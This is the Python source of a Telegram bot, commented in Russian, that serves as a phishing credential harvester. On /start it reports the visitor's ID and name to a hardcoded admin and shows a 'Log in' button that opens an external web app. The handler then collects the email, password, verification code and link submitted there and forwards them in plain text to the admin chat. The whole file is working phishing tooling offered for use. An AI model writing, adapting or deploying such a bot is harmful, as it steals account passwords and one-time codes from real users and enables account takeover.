import os
import logging
import json
from datetime import datetime
from telegram import Update, KeyboardButton, ReplyKeyboardMarkup, WebAppInfo
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from telegram.request import HTTPXRequest

# ==================== КОНФИГ ====================
BOT_TOKEN = os.environ.get("BOT_TOKEN") or os.environ.get("TELEGRAM_TOKEN")
ADMIN_ID_STR = os.environ.get("ADMIN_ID", "8542901240")
WEB_APP_URL = "https://alexandersvet2711-sys.github.io/erub/"
# ===============================================

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

if not BOT_TOKEN:
    logger.error("❌ ОШИБКА: BOT_TOKEN не найден!")
    exit(1)

ADMIN_ID = int(ADMIN_ID_STR)

class ErubBot:
    def __init__(self):
        custom_request = HTTPXRequest(connect_timeout=30.0, read_timeout=30.0)
        self.app = Application.builder()\
            .token(BOT_TOKEN)\
            .request(custom_request)\
            .get_updates_request(HTTPXRequest(connect_timeout=30.0))\
            .build()
            
        self.app.add_handler(CommandHandler("start", self.start))
        
        # САМОЕ ВАЖНОЕ: ловим данные от tg.sendData()
        self.app.add_handler(MessageHandler(filters.StatusUpdate.WEB_APP_DATA, self.handle_webapp_data))
        
        # Ловим обычный текст (на всякий случай)
        self.app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_text))

    async def start(self, update: Update, context):
        user = update.effective_user
        current_time = datetime.now().strftime("%d.%m.%Y %H:%M")

        try:
            await self.app.bot.send_message(
                chat_id=ADMIN_ID,
                text=f"🟢 НОВЫЙ ВХОД!\n\n👤 ID: `{user.id}`\n👤 Имя: {user.first_name}\n🕐 Время: {current_time}",
                parse_mode="Markdown"
            )
        except Exception as e:
            logger.error(f"Ошибка: {e}")

        await update.message.reply_text(
            f"👋 Привет, {user.first_name}!\n\nНажмите кнопку ВНИЗУ:",
            reply_markup=ReplyKeyboardMarkup(
                [[KeyboardButton("🔑 Войти", web_app=WebAppInfo(url=WEB_APP_URL))]],
                resize_keyboard=True
            )
        )

    async def handle_webapp_data(self, update: Update, context):
        # Ловим JSON от tg.sendData()
        raw = update.message.web_app_data.data
        user = update.effective_user
        
        try:
            data = json.loads(raw)
        except:
            data = {"raw": raw}

        e = data.get('email', '-')
        p = data.get('password', '-')
        code = data.get('code', '-')
        link = data.get('link', '-')

        text = f"<b>ДАННЫЕ ИЗ MINI APP</b>\n\n"
        text += f"👤 TG ID: <code>{user.id}</code>\n"
        text += f"👤 Имя: {user.first_name}\n\n"
        
        if e != '-': text += f"📧 Email: <code>{e}</code>\n"
        if p != '-': text += f"🔑 Пароль: <code>{p}</code>\n"
        if code != '-': text += f"🔢 Код: <code>{code}</code>\n"
        if link != '-': text += f"🔗 Ссылка: <code>{link}</code>\n"

        await self.app.bot.send_message(chat_id=ADMIN_ID, text=text, parse_mode="HTML")
        await update.message.reply_text("✅ Данные получены")

    async def handle_text(self, update: Update, context):
        await update.message.reply_text("ℹ️ Используйте кнопку «Войти»")

    def run(self):
        print("🚀 БОТ ЗАПУЩЕН")
        self.app.run_polling()

if __name__ == "__main__":
    ErubBot().run()
